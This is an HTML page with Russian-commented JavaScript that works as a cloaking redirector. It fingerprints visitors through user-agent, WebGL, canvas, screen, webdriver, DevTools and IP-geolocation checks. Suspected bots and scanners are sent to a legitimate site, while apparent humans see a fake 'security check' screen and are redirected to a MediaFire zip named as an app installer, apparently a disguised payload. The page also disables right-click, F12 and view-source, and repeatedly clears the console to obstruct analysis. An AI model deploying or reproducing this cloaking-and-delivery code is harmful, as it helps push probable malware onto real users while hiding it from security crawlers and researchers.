<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      margin: 0; padding: 0; background: linear-gradient(45deg, #1e3c72, #2a5298);
      color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex; justify-content: center; align-items: center; height: 100vh;
    }
    .container { text-align: center; padding: 40px; }
    .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.3);
      border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;
      margin: 0 auto 20px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .message { font-size: 18px; margin: 10px 0; }
    .progress { width: 200px; height: 4px; background: rgba(255,255,255,0.3);
      border-radius: 2px; margin: 20px auto; overflow: hidden; }
    .progress-bar { height: 100%; background: #fff; width: 0%; animation: progress 3s ease-in-out; }
    @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <div class="message">Analyzing traffic...</div>
    <div class="progress"><div class="progress-bar"></div></div>
  </div>

  <script>
    // üî• –ü–†–û–î–í–ò–ù–£–¢–ê–Ø –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø
    const config = {
      // –°—Å—ã–ª–∫–∏ –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
      botLink: 'https://www.syncplicity.com/',
      userLink: 'https://www.mediafire.com/file_premium/sz58shk4kwcduyu/AppSuiteManager-1.0.4-x64.zip/file',
      
      // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–µ—Ç–µ–∫—Ü–∏–∏ –±–æ—Ç–æ–≤
      delay: 3000,
      strictMode: false, // –ú–µ–Ω–µ–µ —Å—Ç—Ä–æ–≥–∞—è –¥–µ—Ç–µ–∫—Ü–∏—è –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö
      
      // üì± –§–ò–õ–¨–¢–†–´ –ü–û –£–°–¢–†–û–ô–°–¢–í–ê–ú –ò –û–°
      deviceFilters: {
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üì± –¢–ò–ü–´ –£–°–¢–†–û–ô–°–¢–í
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        allowMobile: true,        // –ú–æ–±–∏–ª—å–Ω—ã–µ: iPhone, Android, –ø–ª–∞–Ω—à–µ—Ç—ã
        allowDesktop: true,       // –î–µ—Å–∫—Ç–æ–ø: –ü–ö, –Ω–æ—É—Ç–±—É–∫–∏, Mac
        
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üíª –û–ü–ï–†–ê–¶–ò–û–ù–ù–´–ï –°–ò–°–¢–ï–ú–´
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        allowWindows: true,       // Windows 7/8/10/11
        allowMacOS: true,         // macOS (–≤—Å–µ –≤–µ—Ä—Å–∏–∏)
        allowLinux: true,         // Linux, Ubuntu –∏ –¥—Ä.
        allowiOS: true,           // iPhone, iPad
        allowAndroid: true,       // Android —Ç–µ–ª–µ—Ñ–æ–Ω—ã/–ø–ª–∞–Ω—à–µ—Ç—ã
        
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üéØ –ü–†–ò–ú–ï–†–´ –ù–ê–°–¢–†–û–ï–ö:
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // –¢–æ–ª—å–∫–æ –º–æ–±–∏–ª—å–Ω—ã–µ: allowDesktop: false
        // –¢–æ–ª—å–∫–æ iPhone: allowAndroid: false, allowDesktop: false  
        // –¢–æ–ª—å–∫–æ Windows: allowMacOS: false, allowLinux: false, allowMobile: false
        // –ë–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å Android: allowAndroid: false
      },
      
      // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
      blockedCountries: [], // –û—Ç–∫–ª—é—á–µ–Ω–æ
      
      // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏ (–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤ —Ä–∞–±–æ—á–∏–µ —á–∞—Å—ã)
      workingHoursBlock: false,
      workingHours: { start: 9, end: 17 }
    };

    class AdvancedBotDetector {
      constructor() {
        this.suspiciousPoints = 0;
        this.detectionResults = {};
        this.userIP = null;
        this.userLocation = null;
        this.deviceInfo = this.detectDevice();
      }

      // üîç –î–µ—Ç–µ–∫—Ü–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏ –û–°
      detectDevice() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        const info = {
          isMobile: false,
          isDesktop: false,
          os: 'unknown',
          device: 'unknown'
        };

        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –º–æ–±–∏–ª—å–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        if (/iPhone|iPad|iPod/i.test(ua)) {
          info.isMobile = true;
          info.os = 'iOS';
          info.device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
        } else if (/Android/i.test(ua)) {
          info.isMobile = true;
          info.os = 'Android';
          info.device = 'Android';
        } else if (/Mobile|Tablet/i.test(ua)) {
          info.isMobile = true;
          info.os = 'Mobile';
          info.device = 'Mobile';
        }

        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –¥–µ—Å–∫—Ç–æ–ø –û–°
        if (!info.isMobile) {
          info.isDesktop = true;
          
          if (/Windows NT|Win32|Win64|WOW64/i.test(ua)) {
            info.os = 'Windows';
            info.device = 'PC';
          } else if (/Mac OS X|Macintosh|MacIntel/i.test(ua)) {
            info.os = 'macOS';
            info.device = 'Mac';
          } else if (/Linux|X11/i.test(ua)) {
            info.os = 'Linux';
            info.device = 'Linux PC';
          } else if (/CrOS/i.test(ua)) {
            info.os = 'ChromeOS';
            info.device = 'Chromebook';
          }
        }

        return info;
      }

      // üîç –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∞–¥—Ä–µ—Å–∞
      async getUserIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          this.userIP = data.ip;
          return data.ip;
        } catch {
          return null;
        }
      }

      // üåç –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
      async getLocation() {
        try {
          if (!this.userIP) await this.getUserIP();
          
          const response = await fetch(`https://ipapi.co/${this.userIP}/json/`);
          const data = await response.json();
          this.userLocation = data;
          return data;
        } catch {
          return null;
        }
      }

      // ü§ñ –ë–∞–∑–æ–≤—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–æ—Ç–æ–≤
      basicBotChecks() {
        const isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
        
        const checks = {
          userAgent: () => {
            const ua = navigator.userAgent.toLowerCase();
            const patterns = [
              'bot', 'crawler', 'spider', 'scraper', 'automated',
              'googlebot', 'bingbot', 'yandexbot', 'baiduspider',
              'facebookexternalhit', 'twitterbot', 'linkedinbot',
              'headless', 'phantom', 'selenium', 'webdriver', 'chrome-lighthouse'
            ];
            return patterns.some(p => ua.includes(p));
          },

          webGL: () => {
            try {
              const canvas = document.createElement('canvas');
              const gl = canvas.getContext('webgl');
              if (!gl) return !isMobile; // –ù–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö WebGL –º–æ–∂–µ—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å
              
              const vendor = gl.getParameter(gl.VENDOR);
              const renderer = gl.getParameter(gl.RENDERER);
              
              // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ GPU
              const suspicious = [
                'swiftshader', 'llvmpipe', 'virtualbox',
                'vmware', 'microsoft basic render'
              ];
              
              return suspicious.some(s => 
                vendor.toLowerCase().includes(s) || 
                renderer.toLowerCase().includes(s)
              );
            } catch {
              return !isMobile; // –ù–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö –Ω–µ —Å—á–∏—Ç–∞–µ–º –æ—à–∏–±–∫—É –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π
            }
          },

          screen: () => {
            const w = screen.width, h = screen.height;
            // –ò—Å–∫–ª—é—á–∞–µ–º –æ–±—ã—á–Ω—ã–µ –º–æ–±–∏–ª—å–Ω—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è
            if (isMobile) {
              return w < 50 || h < 50 || w > 5000 || h > 5000;
            }
            return w < 100 || h < 100 || 
                   (w === 800 && h === 600) ||
                   w > 3000 || h > 3000;
          },

          plugins: () => {
            // –ù–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö –ø–ª–∞–≥–∏–Ω–æ–≤ –æ–±—ã—á–Ω–æ –Ω–µ—Ç
            return !isMobile && navigator.plugins.length === 0;
          },

          languages: () => {
            const langs = navigator.languages;
            if (isMobile) return false; // –ù–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö
            return !langs || langs.length === 0;
          },

          permissions: () => {
            // –ù–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö permissions API –º–æ–∂–µ—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å
            if (isMobile) return false;
            return !navigator.permissions || 
                   typeof navigator.permissions.query !== 'function';
          },

          connection: () => {
            // –ù–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö connection API –º–æ–∂–µ—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –∏–ª–∏ –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å –º–µ–¥–ª–µ–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
            if (isMobile) return false;
            const conn = navigator.connection;
            return !conn || conn.effectiveType === 'slow-2g';
          },

          touch: () => {
            // –ò—Å–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥–∏–∫—É –¥–ª—è —Ç–∞—á-—É—Å—Ç—Ä–æ–π—Å—Ç–≤
            if (!('ontouchstart' in window)) return false;
            return navigator.maxTouchPoints === 0 && !isMobile;
          }
        };

        let suspicious = 0;
        for (const [name, check] of Object.entries(checks)) {
          try {
            const result = check();
            this.detectionResults[name] = result;
            if (result) suspicious++;
          } catch {
            this.detectionResults[name] = true;
            suspicious++;
          }
        }

        return suspicious >= (config.strictMode ? 3 : 4);
      }

      // üé® Canvas fingerprinting
      canvasFingerprint() {
        const isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
        
        try {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = '#069';
          ctx.fillText('ü§ñ Bot test 123!@#', 2, 15);
          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
          ctx.fillText('Fingerprint test', 4, 45);

          const imageData = canvas.toDataURL();
          
          // –ù–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö canvas –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ
          const minLength = isMobile ? 3000 : 5000;
          if (imageData.length < minLength) return !isMobile;
          
          // –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è headless –±—Ä–∞—É–∑–µ—Ä–æ–≤
          const suspiciousHashes = [
            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA',
            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwA'
          ];
          
          return suspiciousHashes.some(hash => imageData.startsWith(hash));
        } catch {
          return !isMobile; // –ù–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö –Ω–µ —Å—á–∏—Ç–∞–µ–º –æ—à–∏–±–∫—É –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π
        }
      }

      // ‚è∞ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –∏ –ø–æ–≤–µ–¥–µ–Ω–∏—è
      behaviorChecks() {
        const isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
        const checks = [];

        // –°–ª–∏—à–∫–æ–º –±—ã—Å—Ç—Ä–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ (—Ç–æ–ª—å–∫–æ –¥–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞)
        if (!isMobile) {
          checks.push(performance.now() < 30);
        }

        // –ù–µ—Ç –∏—Å—Ç–æ—Ä–∏–∏ –±—Ä–∞—É–∑–µ—Ä–∞ (–º–µ–Ω–µ–µ —Å—Ç—Ä–æ–≥–æ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö)
        if (!isMobile) {
          checks.push(history.length <= 1);
        }

        // –ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π referrer (—É–±–∏—Ä–∞–µ–º —Å–æ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–µ—Ç–∏)
        const ref = document.referrer.toLowerCase();
        const badRefs = ['bit.ly', 'tinyurl.com'];
        checks.push(badRefs.some(domain => ref.includes(domain)));

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ DevTools (—Ç–æ–ª—å–∫–æ –¥–ª—è –¥–µ—Å–∫—Ç–æ–ø–∞)
        if (!isMobile) {
          const devToolsOpen = () => {
            const threshold = 160;
            return window.outerHeight - window.innerHeight > threshold ||
                   window.outerWidth - window.innerWidth > threshold;
          };
          checks.push(devToolsOpen());
        }

        // –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è (—Ç–æ–ª—å–∫–æ —è–≤–Ω—ã–µ –ø—Ä–∏–∑–Ω–∞–∫–∏)
        checks.push(
          navigator.webdriver === true ||
          !!window.phantom ||
          !!window.callPhantom ||
          !!window._phantom ||
          !!window.__nightmare
        );

        return checks.filter(Boolean).length >= 3; // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –ø–æ—Ä–æ–≥
      }

      // üåê –ì–µ–æ–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞
      async geoBlock() {
        if (config.blockedCountries.length === 0) return false;

        try {
          const location = await this.getLocation();
          if (!location) return false;

          return config.blockedCountries.includes(location.country_code);
        } catch {
          return false;
        }
      }

      // üïê –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏
      timeBlock() {
        if (!config.workingHoursBlock) return false;

        const now = new Date();
        const hour = now.getHours();
        const { start, end } = config.workingHours;

        return hour >= start && hour <= end;
      }

      // üì± –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–∏–ª—å—Ç—Ä–æ–≤ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏ –û–°
      deviceFilter() {
        const filters = config.deviceFilters;
        const device = this.deviceInfo;

        console.log('Device info:', device);
        console.log('Device filters:', filters);

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ —Ç–∏–ø—É —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        if (device.isMobile && !filters.allowMobile) {
          console.log('‚ùå Mobile device blocked');
          return true; // –ë–ª–æ–∫–∏—Ä—É–µ–º –º–æ–±–∏–ª—å–Ω—ã–µ
        }

        if (device.isDesktop && !filters.allowDesktop) {
          console.log('‚ùå Desktop device blocked');
          return true; // –ë–ª–æ–∫–∏—Ä—É–µ–º –¥–µ—Å–∫—Ç–æ–ø
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ
        switch (device.os) {
          case 'Windows':
            if (!filters.allowWindows) {
              console.log('‚ùå Windows blocked');
              return true;
            }
            break;

          case 'macOS':
            if (!filters.allowMacOS) {
              console.log('‚ùå macOS blocked');
              return true;
            }
            break;

          case 'Linux':
            if (!filters.allowLinux) {
              console.log('‚ùå Linux blocked');
              return true;
            }
            break;

          case 'iOS':
            if (!filters.allowiOS) {
              console.log('‚ùå iOS blocked');
              return true;
            }
            break;

          case 'Android':
            if (!filters.allowAndroid) {
              console.log('‚ùå Android blocked');
              return true;
            }
            break;
        }

        console.log('‚úÖ Device/OS allowed');
        return false; // –†–∞–∑—Ä–µ—à–∞–µ–º –¥–æ—Å—Ç—É–ø
      }

      // üìä –§–∏–Ω–∞–ª—å–Ω–∞—è –æ—Ü–µ–Ω–∫–∞
      async detect() {
        console.log('üîç Starting advanced bot detection...');

        // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–∏–ª—å—Ç—Ä—ã —É—Å—Ç—Ä–æ–π—Å—Ç–≤ (–ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞)
        const isDeviceBlocked = this.deviceFilter();
        if (isDeviceBlocked) {
          console.log('üö´ Device/OS blocked by filters');
          return true; // –°—Ä–∞–∑—É –±–ª–æ–∫–∏—Ä—É–µ–º –µ—Å–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ/–û–° –Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω—ã
        }

        const checks = await Promise.all([
          this.basicBotChecks(),
          this.canvasFingerprint(),
          this.behaviorChecks(),
          this.geoBlock(),
          this.timeBlock()
        ]);

        const [isBasicBot, isSuspiciousCanvas, isSuspiciousBehavior, isGeoBlocked, isTimeBlocked] = checks;

        const totalSuspicious = checks.filter(Boolean).length;
        
        console.log('Detection results:', {
          deviceInfo: this.deviceInfo,
          basicBot: isBasicBot,
          suspiciousCanvas: isSuspiciousCanvas,
          suspiciousBehavior: isSuspiciousBehavior,
          geoBlocked: isGeoBlocked,
          timeBlocked: isTimeBlocked,
          totalScore: totalSuspicious,
          userIP: this.userIP,
          location: this.userLocation?.city + ', ' + this.userLocation?.country_name
        });

        // –°—Ç—Ä–æ–≥–∏–π —Ä–µ–∂–∏–º: 2+ –ø—Ä–æ–≤–µ—Ä–∫–∏ = –±–æ—Ç
        // –û–±—ã—á–Ω—ã–π —Ä–µ–∂–∏–º: 3+ –ø—Ä–æ–≤–µ—Ä–∫–∏ = –±–æ—Ç
        return config.strictMode ? totalSuspicious >= 2 : totalSuspicious >= 3;
      }
    }

    // üöÄ –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞
    async function main() {
      const detector = new AdvancedBotDetector();
      
      try {
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        document.querySelector('.message').textContent = 'Checking security...';
        
        // –î–µ—Ç–µ–∫—Ü–∏—è
        const isBot = await detector.detect();
        
        // –í—ã–±–∏—Ä–∞–µ–º —Å—Å—ã–ª–∫—É
        const redirectUrl = isBot ? config.botLink : config.userLink;
        
        console.log(`üéØ Redirecting to: ${isBot ? 'BOT' : 'USER'} link`);
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        document.querySelector('.message').textContent = 
          isBot ? 'Security check complete' : 'Security check...';
        
        // –†–µ–¥–∏—Ä–µ–∫—Ç
        setTimeout(() => {
          window.location.replace(redirectUrl);
        }, config.delay);

      } catch (error) {
        console.error('‚ùå Detection error:', error);
        // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ - —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º –∫–∞–∫ –±–æ—Ç–∞
        setTimeout(() => {
          window.location.replace(config.botLink);
        }, config.delay);
      }
    }

    // üîí –ó–∞—â–∏—Ç–∞ –æ—Ç –∞–Ω–∞–ª–∏–∑–∞
    (() => {
      // –û—Ç–∫–ª—é—á–∞–µ–º –ø—Ä–∞–≤—ã–π –∫–ª–∏–∫
      document.addEventListener('contextmenu', e => e.preventDefault());
      
      // –û—Ç–∫–ª—é—á–∞–µ–º –≥–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏
      document.addEventListener('keydown', e => {
        if (e.key === 'F12' || 
            (e.ctrlKey && (e.key === 'u' || e.key === 'U')) ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i'))) {
          e.preventDefault();
        }
      });

      // –û—á–∏—â–∞–µ–º –∫–æ–Ω—Å–æ–ª—å –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ
      if (location.hostname !== 'localhost') {
        console.clear();
        setInterval(() => console.clear(), 1000);
      }
    })();

    // –ó–∞–ø—É—Å–∫
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', main);
    } else {
      main();
    }
  </script>
